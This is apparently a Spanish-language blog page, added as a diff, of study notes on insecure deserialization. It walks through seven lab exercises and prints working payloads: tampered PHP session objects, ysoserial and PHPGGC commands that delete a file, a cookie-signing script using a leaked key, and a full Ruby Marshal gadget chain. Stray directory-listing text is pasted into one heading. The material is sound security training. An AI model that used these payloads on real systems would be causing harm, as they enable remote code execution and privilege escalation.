@@ -1,0 +1,438 @@
+<h2 id="0-índice">0. Índice.</h2>
+
+<ul>
+  <li>1 Antecedentes.
+    <ul>
+      <li>1.1. Concepto de serialización y deserialización.</li>
+      <li>1.2. Deserialización Insegura.</li>
+    </ul>
+  </li>
+  <li>2 Explotación de vulnerabilidades de deserialización inseguras.
+    <ul>
+      <li>2.1. Antecedentes. Formatos de serialización.</li>
+      <li>2.2. Manipulación de objetos serializados.</li>
+    </ul>
+  </li>
+  <li>3 Trabajando con dispositivos en cadena.
+    <ul>
+      <li>3.1. ysoserial.</li>
+      <li>3.2. PHP Generic Gadget Chain.</li>
+      <li>3.3. Trabajando con gadget chains documentadas.</li>
+    </ul>
+
+    <p><br /></p>
+  </li>
+</ul>
+
+<h3 id="1-antecedentes">1. Antecedentes.</h3>
+
+<h4 id="11-concepto-de-serialización-y-deserialización">1.1. Concepto de serialización y deserialización.</h4>
+
+<p>La <strong>serialización</strong> de un objeto es el proceso de conversión de estructuras de datos complejas a formatos más simples, como un flujo de bytes, que permita la escritura y transmisión de datos de una manera más sencilla.</p>
+
+<p>La <strong>deserialización</strong> es el proceso de restaurar este formato simple, como un flujo de bytes, a una réplica completamente funcional del objeto original, en el estado exacto en que se serializó para que pueda ser implementado dentro de la lógica del sitio web.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220506100401.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h4 id="12-deserialización-insegura">1.2. Deserialización Insegura.</h4>
+
+<p>Una <strong>deserialización insegura</strong> permite que un atacante introduzca objetos dañinos al código de la aplicación.</p>
+
+<p>Incluso es posible reemplazar un objeto serializado con un objeto de una clase completamente diferente. Por esta razón, <strong>la deserialización insegura a veces se conoce como una vulnerabilidad de “inyección de objetos”</strong>.</p>
+
+<p>Esta generalmente surge porque existe una falta general de comprensión de cuán peligrosa puede ser la deserialización de datos controlables por el usuario. <strong>Idealmente, ningún dato potencialmente controlable por el usuario nunca debe deserializarse en absoluto</strong>, no es posible deserializar de forma segura la entrada de datos que no es de confianza.</p>
+
+<p><br /></p>
+
+<h3 id="2-explotación-de-vulnerabilidades-de-deserialización-inseguras">2. Explotación de vulnerabilidades de deserialización inseguras.</h3>
+
+<p>Aunque muchos de los laboratorios y ejemplos se basan en PHP, la mayoría de las técnicas de explotación son igualmente válidas para otros lenguajes.</p>
+
+<p><br /></p>
+
+<h4 id="21-antecedentes-formatos-de-serialización">2.1. Antecedentes. Formatos de serialización.</h4>
+
+<p>Identificar la deserialización insegura es relativamente simple, durante la auditoría, debe observar todos los datos que se transfieren al sitio web e <strong>intentar identificar cualquier cosa que parezca datos serializados. Los datos serializados se pueden identificar con relativa facilidad si conoce el formato que utilizan los diferentes lenguajes</strong>. En esta sección, mostraremos ejemplos de la serialización de PHP y Java. Una vez que identifique los datos serializados, puede probar si puede controlarlos.</p>
+
+<ul>
+  <li><strong>Formato de serialización PHP</strong>:</li>
+</ul>
+
+<p>PHP utiliza un formato de cadena en su mayoría legible por humanos, con letras que representan el tipo de datos y números que representan la longitud de cada entrada. Por ejemplo, considere un <em>User</em> objeto con los atributos:</p>
+
+<pre><code class="language-PHP">$user-&gt;name = "carlos";
+$user-&gt;isLoggedIn = true;
+</code></pre>
+
+<p>Al serializarse, el objeto se ve como sigue:</p>
+
+<pre><code class="language-default">O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
+</code></pre>
+
+<p>Que se interpreta de la siguiente manera:</p>
+
+<ul>
+  <li><strong>0:4:”User”</strong>: Un objeto con el nombre de clase de cuatro caracteres; User.</li>
+  <li><strong>2</strong>: El objeto tiene 2 atributos.</li>
+  <li><strong>s:4:”name”</strong>: La clave del primer atributo es un string de 4 caracteres “name”.</li>
+  <li><strong>s:6:”carlos”</strong>: El valor del primer atributo es la cadena de 6 caracteres “carlos”.</li>
+  <li><strong>s:10:”isLoggedIn”</strong>: La clave del segundo atributo es un string de 10 caracteres “isLoggedIn”.</li>
+  <li><strong>b:1</strong>: El valor del segundo atributo es el valor booleano true.</li>
+</ul>
+
+<p>Los métodos nativos para la serialización de PHP son <em>serialize()</em> y <em>unserialize()</em>. Si tiene acceso al código fuente, debe comenzar por buscar en <em>unserialize()</em> cualquier parte del código e investigar más a fondo.</p>
+
+<p><br /></p>
+
+<ul>
+  <li><strong>Formato de serialización de Java</strong>:</li>
+</ul>
+
+<p>Algunos lenguajes, como Java, usan formatos de serialización binarios. Esto es más difícil de leer, pero aún puede identificar datos serializados si sabe cómo reconocer algunos signos reveladores. Por ejemplo, los objetos Java serializados siempre comienzan con los mismos bytes, que se codifican ’ac ed’ en hexadecimal y ’rO0’ en Base64.</p>
+
+<p>Cualquier clase que implemente la interfaz <em>java.io.Serializable</em> se puede serializar y deserializar. Si tiene acceso al código fuente, tome nota de cualquier código que use el <em>readObject()</em> método, que se usa para leer y deserializar datos de un archivo <em>InputStream</em>.</p>
+
+<p><br /></p>
+
+<h4 id="22-manipulación-de-objetos-serializados">2.2. Manipulación de objetos serializados.</h4>
+
+<p>En términos generales, hay dos enfoques que puede tomar al manipular objetos serializados. Puede editar el objeto directamente en su forma de flujo de bytes o puede escribir un script breve en el lenguaje de programación correspondiente para crear y serializar el nuevo objeto. El último enfoque suele ser más fácil cuando se trabaja con formatos de serialización binarios.</p>
+
+<ul>
+  <li><strong>Modificación de atributos de objetos</strong>:</li>
+</ul>
+
+<p>Al manipular los datos, siempre que el atacante conserve un objeto serializado válido, el proceso de deserialización creará un objeto del lado del servidor con los valores de atributos modificados.</p>
+
+<p>Como ejemplo simple, considere un sitio web que utiliza un <em>User</em> objeto serializado para almacenar datos sobre la sesión de un usuario en una cookie. Si un atacante detecta este objeto serializado en una solicitud HTTP, podría decodificarlo para encontrar el siguiente flujo de bytes:</p>
+
+<pre><code class="language-default">O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
+</code></pre>
+
+<p>Ahí podemos observar que el objeto User tiene un atributo booleano, isAdmin que tiene valor 0, indicando presumiblemente que se trata de un usuario normal. Interceptando la request y cambiando el valor booleano del objeto deserializado y volver a serializarlo. Evidentemente, de forma aislada esto no tiene efecto, pero al volver a codificar el objeto, la cookie se sobreescribe alterando los permisos del usuario.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$user</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="n">isAdmin</span> <span class="o">===</span> <span class="kc">true</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// allow access to admin interface }</span>
+</code></pre></div></div>
+
+<p>Este código vulnerable crearía una instancia de un <em>User</em> objeto en función de los datos de la cookie, incluido el <em>isAdmin</em> atributo modificado por el atacante. En ningún momento se comprueba la autenticidad del objeto serializado. Luego, estos datos se pasan a la declaración condicional y, en este caso, permitirían una fácil escalada de privilegios.</p>
+
+<p>Este escenario simple no es común en la naturaleza. Sin embargo, editar un valor de atributo de esta manera demuestra el primer paso para acceder a la enorme cantidad de superficie de ataque expuesta por la deserialización insegura.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 1: Modifying serialized objects</strong></p>
+
+<p>Este laboratorio simula una aplicación web que utiliza una sesión manejada desde la serialización y, por ende, es vulnerable a una escalada de privilegios. El laboratorio se resuelve ganando privilegios de admin y borrando al usuario carlos. Disponemos de las credenciales wiener:peter.</p>
+
+<p>En primer lugar, como sabemos que la sesión está manejada desde la serialización, la cookie de sessión debe tener información sobre las características del usuario. Así, introducimos el valor de la cookie en Decodify para comprobar si se consigue descifrar la misma:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220506112753.png" text-align="center" />
+</div>
+
+<p>Así, podemos observar que efectivamente se trata de un objeto PHP deserializado y cifrado en base64. De entre los atributos podemos observar uno que es isAdmin que se trata de un valor booleano que tiene valor 0. Cogemos el string entero, le cambiamos el 0 por el 1 y lo llevamos al codificador de Burp, donde lo codificamos en Base64:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220506112948.png" text-align="center" />
+</div>
+
+<p>Seguidamente, sustituimos la cookie verdadera por la maliciosa y al liberar la request observamos que tenemos acceso al panel de administrador.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220506113031.png" text-align="center" />
+</div>
+
+<p>Así, terminaríamos el laboratorio accediendo a dicho panel (perseverando en el cambio de la cookie con la intercepción de cada request) y borrando al usuario carlos.</p>
+
+<p><br /></p>
+
+<ul>
+  <li><strong>Modificar tipos de datos</strong></li>
+</ul>
+
+<p>Hemos visto cómo puede modificar valores de atributos en objetos serializados, pero también es posible proporcionar tipos de datos inesperados.</p>
+
+<p>La lógica basada en PHP es particularmente vulnerable a este tipo de manipulación debido al comportamiento de su operador de comparación flexible ( ==) al comparar diferentes tipos de datos. Por ejemplo, si realiza una comparación suelta entre un número entero y una cadena, PHP intentará convertir la cadena en un número entero, lo que significa que 5 == “5”se evalúa como ’true’.</p>
+
+<p>Inusualmente, esto también funciona para cualquier cadena alfanumérica que comience con un número. En este caso, PHP convertirá efectivamente la cadena completa a un valor entero basado en el número inicial. El resto de la cadena se ignora por completo. Por lo tanto, 5 == “5 of something”  en la práctica se trata como  5 == 5 .</p>
+
+<p>Esto se vuelve aún más extraño cuando se compara una cadena con el entero 0 == “Algo” se trata como cierto porque en el string no hay números.</p>
+
+<p>Consideremos un caso en el que este operador de comparación flexible se usa junto con datos controlables por el usuario de un objeto deserializado. Esto podría resultar potencialmente en  fallas lógicas peligrosas .</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$login</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">)</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$login</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// log in successfully }</span>
+</code></pre></div></div>
+
+<p>Supongamos que un atacante modificó el atributo de la contraseña para que contuviera el número entero ’0’ en lugar de la cadena esperada. Siempre que la contraseña almacenada no comience con un número, la condición siempre regresaría ’true’, lo que permitiría omitir la autenticación. Tenga en cuenta que esto solo es posible porque la deserialización conserva el tipo de datos. Si el código obtuvo la contraseña de la solicitud directamente, ’0’ se convertiría en una cadena y la condición se evaluaría como ’false’.</p>
+
+<p>Tenga en cuenta que al modificar los tipos de datos en cualquier formato de objeto serializado, es importante recordar actualizar también las etiquetas de tipo y los indicadores de longitud en los datos serializados. De lo contrario, el objeto serializado se dañará y no se deserializará.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 2: Modifying serialized data types</strong></p>
+
+<p>Este laboratorio tiene un mecanismo de gestión de sesión basado en objetos serializados.</p>
+
+<p>En primer lugar, accedemos con nuestras credenciales proporcionadas wiener:peter y comprobamos las cookies, las cuales decodificamos en base64 obteniendo que se trata de un objeto serializado que contiene características importantes de la sesión del usuario como el nombre y el token de acceso.
+O:4:”User”:2:{s:8:”username”;s:6:”wiener”;s:12:”access_token”;s:32:”klgz4jz2vp8qq8ev5qpx25c2bt2m0fgq”;fQ%3d%3d</p>
+
+<p>Así, podemos elaborar la siguiente hipóteisis. El manejo de la sesión se basa en la evaluación de las dos características presentes en el cookie. Así, cambiamos por un lado el nombre de “wiener” a “administrator” y aprovechamos la vulnerabilidad descrita en el apartado anterior para igualar el token de acceso al entero 0 e intentar que de esa forma, por una malconfiguración del servidor, se de por válido:</p>
+
+<p>O:4:”User”:2:{s:8:”username”;s:13:”administrator”;s:12:”access_token”;i:0;}</p>
+
+<p>Observemos que hemos cambiado el tipo de dato que es el acces token, un entero, ‘i’ de valor 0 y como no es un string no lleva dobles comillas.</p>
+
+<p>De esa forma conseguimos una cookie de sesión valida para hacernos pasar por el administrador y de ahí accederíamos al panel de administrador y borraríamos al usuario carlos (siendo persistente con el cambio de cookie en cada request).</p>
+
+<p><br /></p>
+
+<ul>
+  <li><strong>Uso de la funcionalidad de la aplicación</strong></li>
+</ul>
+
+<p>Además de simplemente verificar los valores de los atributos, la funcionalidad de un sitio web también puede realizar operaciones peligrosas en los datos de un objeto deserializado. En este caso, puede usar la deserialización insegura para pasar datos inesperados y aprovechar la funcionalidad relacionada para causar daños.</p>
+
+<p>Por ejemplo, como parte de la funcionalidad “Eliminar usuario” de un sitio web, la imagen de perfil del usuario se elimina al acceder a la ruta del archivo en el atributo <strong>$user-&gt;image_location</strong> . Si $user se creó a partir de un objeto serializado, un atacante podría explotarlo pasando un objeto modificado con el ’image_location’ conjunto a una ruta de archivo arbitraria. Eliminar su propia cuenta de usuario también eliminaría este archivo arbitrario.</p>
+
+<p><br /></p>
+
+<p>**Laboratorio 3: Using application functionality to exploit insecure deserialization Apuntes apuntesHechos Burp Desktop Documents Downloads file1.txt file.txt Music Pictures Public scriptApuntes.sh SQLInjection.md Templates Videos</p>
+
+<p>Esta práctica de laboratorio utiliza un mecanismo de sesión basado en serialización. Cierta característica invoca un método peligroso en los datos proporcionados en un objeto serializado. Para resolver el laboratorio, edite el objeto serializado en la cookie de sesión y utilícelo para eliminar el archivo morale.txt del directorio de inicio de Carlos.</p>
+
+<p>Puede iniciar sesión en su propia cuenta con las siguientes credenciales: wiener:peter</p>
+
+<p>También tienes acceso a una cuenta de respaldo: gregg:rosebud</p>
+
+<p>En primer lugar, nos logeamos con nuestras credenciales y observamos que asociado a nuestra cuenta, tenemos también un avatar que consiste en un fichero imagen. Obtenemos las cookies de sesión y las decodificamos en base64 con las herramientas de BurpSuite:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220507102817.png" text-align="center" />
+</div>
+
+<p>Seguidamente, identificamos que el path del fichero antes mencionado se encuentra dentro del objeto cookie serializado y podemos realizar la hipótesis de que cuando borramos nuestra cuenta, el avatar se borra con ella siguiendo el path proporcionado por la cookie de sesión. Así, cambiando el path de dicho fichero podríamos borrar otro archivo.</p>
+
+<p>Así, cambiamos dicha ruta a /home/carlos/morale.txt y cambiamos el tamaño del fichero en cuestión como s:23.</p>
+
+<p>Seguidamente volvermos a codificar en base64</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220507102951.png" text-align="center" />
+</div>
+
+<p>Y sustituimos dicha cookie en una request POST para borrar nuestra cuenta. De esta forma, se borra nuestra cuenta y el fichero seleccionado como avatar_link que resulta ser el dichero morale.txt de Carlos.</p>
+
+<p><br /></p>
+
+<p><br /></p>
+
+<p><strong>Inyección arbitraria de objetos</strong></p>
+
+<p>Como hemos visto, ocasionalmente es posible explotar la deserialización insegura simplemente editando el objeto proporcionado por el sitio web. Sin embargo, inyectar tipos de objetos arbitrarios puede abrir muchas más posibilidades.</p>
+
+<p>En la programación orientada a objetos, los métodos disponibles para un objeto están determinados por su clase. Por lo tanto, si un atacante puede manipular qué clase de objeto se pasa como datos serializados, puede influir en qué código se ejecuta después e incluso durante la deserialización.</p>
+
+<p>Los métodos de deserialización no suelen comprobar lo que están deserializando. Esto significa que puede pasar objetos de cualquier clase serializable que esté disponible para el sitio web y el objeto se deserializará. Esto permite efectivamente que un atacante cree instancias de clases arbitrarias. El hecho de que este objeto no sea de la clase esperada no importa. El tipo de objeto inesperado puede causar una excepción en la lógica de la aplicación, pero el objeto malicioso ya habrá sido instanciado para entonces.</p>
+
+<p>Si un atacante tiene acceso al código fuente, puede estudiar todas las clases disponibles en detalle. Para construir un exploit simple, buscarían clases que contengan métodos mágicos de deserialización y luego verificarían si alguno de ellos realiza operaciones peligrosas en datos controlables. Luego, el atacante puede pasar un objeto serializado de esta clase para usar su método mágico para un exploit.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 4: Arbitrary object injection in PHP</strong></p>
+
+<p>Este laboratorio utiliza un mecanismo de sesión basado en serialización y, como resultado, es vulnerable a la inyección de objetos arbitrarios. Para resolver el laboratorio, cree e inyecte un objeto serializado malicioso para eliminar el archivo morale.txt del directorio de inicio de Carlos. Deberá obtener acceso al código fuente para resolver este laboratorio.</p>
+
+<p>Puede iniciar sesión en su propia cuenta con las siguientes credenciales: wiener:peter</p>
+
+<p>En primer lugar, observamos que el sitio web referencia un fichero:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220507111540.png" text-align="center" />
+</div>
+
+<p>Llevamos la request al Repeater y poniendo un guion torcido alfinal del nombre del fichero podemos ver el código:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220507111620.png" text-align="center" />
+</div>
+
+<p>Para interpretar este código es necesario recordar que PHP es un lenguaje orientado a objetos. Este está definido por clases que no es más que un “estereotipo” que se materializa en objetos (que son instancias de cada clase)=. Este código define cómo se procesa el objeto serializado y en el último párrafo invoka al método _destruct si en el objeto que se procesa se encuentra el atributo “lock_file_path” que borrará el fichero marcado por el path en el siguiente atributo.</p>
+
+<p>Así, con el fin de borrar el fichero “morale.txt” marcado modificamos el objeto serializado (la cookie) cambiando los atributos mencionados anteriomente como sigue a continuación:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">O</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">"CustomTemplate"</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">"lock_file_path"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">23</span><span class="o">:</span><span class="s2">"/home/carlos/morale.txt"</span><span class="p">;}</span>
+</code></pre></div></div>
+
+<p>Cogemos el objeto y codificamos en base64 y llevamos dicha cookie a una request, de esa forma y según la lógica del código, el fichero habrá quedado borrado.</p>
+
+<p><br /></p>
+
+<h3 id="3-trabajando-con-dispositivos-en-cadena">3. Trabajando con dispositivos en cadena.</h3>
+
+<p>Un <strong>gadget</strong> (o dispositivo) es un fragmento de código que existe dentro de una aplicación web y que puede ser aprovechado por un atacante para perpetrar un acto ilícito.</p>
+
+<p>En principio, no se trata de algo intrínsecamente dañino al fin y al cabo el atacante no tiene el control del código, este ya existe dentro de la aplicación web. Sin embargo, por cuestiones de malconfiguración, un atacante podría inyectar código con el que podría llegar a obtener un comportamiento malicioso de uno o una cadena de estos gadgets debido a que, a menudo, el input del atacante pasa de un dispositivo a otro hasta que llega al gadget en el que realmente el payload resulta autenticamente dañino.</p>
+
+<p>Muchas vulnerabilidades basadas en la deserialización insegura requieren de cadenas de gadgets.</p>
+
+<p>Identificar manualmente una cadena de dispositivos para llevar a cabo un exploit puede ser una tarea ardua y es casi imposible sin acceso directo al código fuente (tal y como hemos visto en el laboratorio anterior). Afortunadamente, muchas aplicaciones web suelen reutilizar código de otras aplicaciones web y heredan de esa forma exploits asociados con las cadenas de gadgets que adoptan.</p>
+
+<p>Existen muchas herramientas para identificar un rango de cadenas de dispositivos ya empleadas para explotar las mismas vulnerabilidades en otros sitios web.</p>
+
+<p><br /></p>
+
+<h4 id="31-ysoserial">3.1. ysoserial.</h4>
+
+<p>Ysoserial es un <em>proof-of-concept</em> tool que generan payloads para explotar vulnerabilidades de deserialización insegura de objetos Java. Se trata de una de las mencionadas herramientas que generan código basado en cadenas de dispositivos empleadas popularmente por diversas aplicaciones web en Java.</p>
+
+<p>Podemos descargar esta herramienta desde Github:</p>
+
+<p>https://github.com/frohoff/ysoserial</p>
+
+<p>En el apartado instalación encontraremos un link desde el que podremos descargar el .jar apropiado.
+Veámos ahora un ejemplo de cómo se utiliza esta herramienta:</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 5: Exploiting Java deserialization with Apache Commons</strong></p>
+
+<p>Este laboratorio utiliza un mecanismo de sesión basado en serialización y carga la biblioteca <em>Apache Commons Collections</em>. Aunque no tiene acceso al código fuente, aún puede explotar este laboratorio utilizando cadenas de dispositivos preconstruidos.</p>
+
+<p>Para resolver el laboratorio, use una herramienta de terceros para generar un objeto serializado malicioso que contenga una carga útil de ejecución remota de código. Luego, pase este objeto al sitio web para eliminar el archivo morale.txt del directorio de inicio de Carlos.</p>
+
+<p>Puede iniciar sesión en su propia cuenta con las siguientes credenciales: wiener:peter y accedemos a la cookie de sesión. Al decodificarla en Base64 observamos que se trata de un objeto serializado que contiene características del usuario.</p>
+
+<p>Eliminamos la cookie y en su lugar introducimos un valor arbitrario para intentar provocar un error y obtener información:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220520173908.png" text-align="center" />
+</div>
+
+<p>Ahí podemos observar que la cookie se procesa mediante código Java y por ende, el empleo de una herramienta como Ysoserial para construir un payload con el que conseguir ejecutar una acción dentro del servidor aprovechándonos del motor Java que procesa la cookie podría ser buena idea.</p>
+
+<p>Así, descargamos la herramienta e introducimos el siguiente código:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> path/to/ysoserial.jar CommonsCollections4 <span class="s1">'rm /home/carlos/morale.txt'</span> | <span class="nb">base64</span>
+</code></pre></div></div>
+
+<p>Así, lo que hacemos es fabricar un payload utilizando el .jar para la versión de la gadget chain “CommonsCollection4” tal y como indica el enunciado para que se ejecute el comando de borrado de un fichero del usuario Carlos y luego el payload se códifique en Base64.</p>
+
+<p>La clave es introducir el output de ese comando devuelta en la cookie en cuestión y lanzarla sobre una request.</p>
+
+<p>El resultado será un error ya que no reconocerá sesión alguna, pero se ejecutará nuestro comando consiguiendo el borrado del fichero del usuario Carlos.</p>
+
+<p><br /></p>
+
+<h4 id="32-php-generic-gadget-chain">3.2. PHP Generic Gadget Chain.</h4>
+
+<p>Muchos lenguajes sufren de manera frecuente de vulnerabilidades de deserialización insegura y a menudo tienen herramientas similares a ysoserial con Java.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 6: Exploiting PHP deserialization with a pre-built gadget chain</strong></p>
+
+<p>Este laboratorio posee una gestión de sesión basada en la serialización de un objeto en forma de cookie. Además, emplea un marco PHP y no tiene acceso al código fuente.</p>
+
+<p>Para resolver este laboratorio, hay que utillizar una herramienta de terceros para borrar el fichero morale.txt situado en el directorio home del usuario Carlos.</p>
+
+<p>Accedemos al laboratorio y procedemos a logearnos. Al intentar descifrar la cookie observamos que se trata de un objeto serializado codificado en Base64.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220521022858.png" text-align="center" />
+</div>
+
+<p>Intentamos generar un mensaje de error para extraer información del marco de procesamietno de la cookie enviando un valor alterado de la misma obteniendo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220520183114.png" text-align="center" />
+</div>
+
+<p>Así, ya sabemos que el marco de trabajo es Symfony, que la versión es 4.3.6 y que el lenguaje de programación es PHP.</p>
+
+<p>Por otra parte, observamos en el código fuente de la página un comentario que indica la ruta a un fichero de debug:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220520184637.png" text-align="center" />
+</div>
+
+<p>En él encontramos datos relevantes entre otros, el valor de una SECRET_KEY necesaria para generar una cookie valida para el procesamiento.</p>
+
+<p>Seguidamente, descargamos PHPGGC desde el enlace: https://github.com/ambionics/phpggc y le trasladamos el siguiente comando:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./phpggc Symfony/RCE4 <span class="nb">exec</span> <span class="s1">'rm /home/carlos/morale.txt'</span> | <span class="nb">base64</span>
+</code></pre></div></div>
+
+<p>De esta forma, hemos obtenido un payload en forma de objeto serializado que explota un gadget chain de Symfony. En el anteior laboratorio llegados a este punto, lo hemos codificado en Base64 y desde ahí lo hemos reintroducido en el valor de la cookie y lo hemos enviado en una request con la que se ha procesado el payload.</p>
+
+<p>Sin embargo, ahora las cosas son distintas. La cookie de sesión consta de dos partes como hemos visto. Una parte que defenía las características del usuario y otra parte que contiene una firma que validad la legitimidad de la cookie. Así, para que la cookie se acepte y consigamos que el payload se procese debemos firmarla adecuadamente. Para ello empleamos el siguiente script PHP:</p>
+
+<pre><code class="language-PHP">$object = "OBJECT-GENERATED-BY-PHPGGC"; $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"; $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}'); echo $cookie;
+</code></pre>
+
+<p>Quedando como:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220521035301.png" text-align="center" />
+</div>
+
+<p>Así, ejecutamos el script y copiamos el output sobre el valor de la cookie y enviamos la request. Terminando el laboratorio.</p>
+
+<p><br /></p>
+
+<h4 id="33-trabajando-con-gadget-chains-documentadas">3.3. Trabajando con gadget chains documentadas.</h4>
+
+<p>Es posible que no siempre haya una herramienta dedicada disponible para explotar cadenas de gadgets conocidas en el marco utilizado por la aplicación de destino.</p>
+
+<p>En este caso, siempre vale la pena buscar en línea para ver si hay vulnerabilidades documentadas que pueda adaptar manualmente. Ajustar el código puede requerir una comprensión básica del lenguaje y el marco, y es posible que a veces necesite serializar el objeto usted mismo, pero este enfoque aún requiere mucho menos esfuerzo que construir un exploit desde cero.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 7: Explotando deserialización Ruby usando una gadget chain documentada</strong>.</p>
+
+<p>Este laboratorio tiene un mecanismo de sesión basado en un objeto serializado en forma de cookie.
+Completamos un laboratorio construyendo un laboratorio que borre el fichero /morale.txt localizado en el home del usuario Carlos buscando en google Universal Deserialisation Gadget for Ruby 2.x-3.x by vakzz y lo retocamos para que quede como sigue:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Gem</span><span class="o">::</span><span class="no">SpecFetcher</span>
+<span class="no">Gem</span><span class="o">::</span><span class="no">Installer</span>
+
+<span class="k">module</span> <span class="nn">Gem</span>
+<span class="k">class</span> <span class="nc">Requirement</span>
+<span class="k">def</span> <span class="nf">marshal_dump</span>
+<span class="p">[</span><span class="vi">@requirements</span><span class="p">]</span>
+<span class="k">end</span>
+<span class="k">end</span>
+<span class="k">end</span>
+
+<span class="n">wa1</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">WriteAdapter</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="no">Kernel</span><span class="p">,</span> <span class="ss">:system</span><span class="p">)</span>
+
+<span class="n">rs</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">RequestSet</span><span class="p">.</span><span class="nf">allocate</span>
+<span class="n">rs</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@sets'</span><span class="p">,</span> <span class="n">wa1</span><span class="p">)</span>
+<span class="n">rs</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@git_set'</span><span class="p">,</span> <span class="s2">"COMMAND"</span><span class="p">)</span>
+
+<span class="n">wa2</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">WriteAdapter</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">rs</span><span class="p">,</span> <span class="ss">:resolve</span><span class="p">)</span>
+
+<span class="n">i</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Package</span><span class="o">::</span><span class="no">TarReader</span><span class="o">::</span><span class="no">Entry</span><span class="p">.</span><span class="nf">allocate</span>
+<span class="n">i</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@read'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="n">i</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@header'</span><span class="p">,</span> <span class="s2">"aaa"</span><span class="p">)</span>
+
+
+<span class="n">n</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">BufferedIO</span><span class="p">.</span><span class="nf">allocate</span>
+<span class="n">n</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@io'</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+<span class="n">n</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@debug_output'</span><span class="p">,</span> <span class="n">wa2</span><span class="p">)</span>
+
+<span class="n">t</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Package</span><span class="o">::</span><span class="no">TarReader</span><span class="p">.</span><span class="nf">allocate</span>
+<span class="n">t</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@io'</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Requirement</span><span class="p">.</span><span class="nf">allocate</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@requirements'</span><span class="p">,</span> <span class="n">t</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="no">Marshal</span><span class="p">.</span><span class="nf">dump</span><span class="p">([</span><span class="no">Gem</span><span class="o">::</span><span class="no">SpecFetcher</span><span class="p">,</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Installer</span><span class="p">,</span> <span class="n">r</span><span class="p">])</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div></div>
+
